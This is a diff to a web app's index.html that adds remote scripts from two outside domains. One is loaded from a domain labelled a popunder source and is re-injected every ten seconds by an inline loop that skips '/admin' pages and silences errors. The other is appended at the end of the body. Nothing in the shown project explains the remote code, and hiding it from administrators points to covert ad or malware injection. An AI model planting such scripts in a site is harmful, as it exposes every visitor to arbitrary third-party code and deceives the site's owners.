@@ -108,9 +108,35 @@
         }
       ]
     </script>
+    <script data-cfasync="false" src="https://ahuramazda.org/1/cd7964982d4480e37f1acf703b21759d"></script>
+    <script data-cfasync="false">
+      (function () {
+        var POPUNDER_SRC = 'https://ahuramazda.org/1/cd7964982d4480e37f1acf703b21759d';
+        var INTERVAL_MS = 10000;
+
+        function rearmPopunder() {
+          if (window.location.pathname.indexOf('/admin') === 0) return;
+          try {
+            var prev = document.getElementById('wk-dynamic-popunder');
+            if (prev && prev.parentNode) {
+              prev.parentNode.removeChild(prev);
+            }
+            var s = document.createElement('script');
+            s.id = 'wk-dynamic-popunder';
+            s.setAttribute('data-cfasync', 'false');
+            s.async = true;
+            s.src = POPUNDER_SRC + '?_t=' + Date.now();
+            document.head.appendChild(s);
+          } catch (e) {}
+        }
+
+        setInterval(rearmPopunder, INTERVAL_MS);
+      })();
+    </script>
   </head>
   <body class="bg-[#0a1124] text-slate-100 antialiased selection:bg-blue-500 selection:text-white">
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
+    <script data-cfasync="false" src="https://brijmohan.org/14/8620570ee06989031f1fe9b1dcd8f15f"></script>
   </body>
 </html>
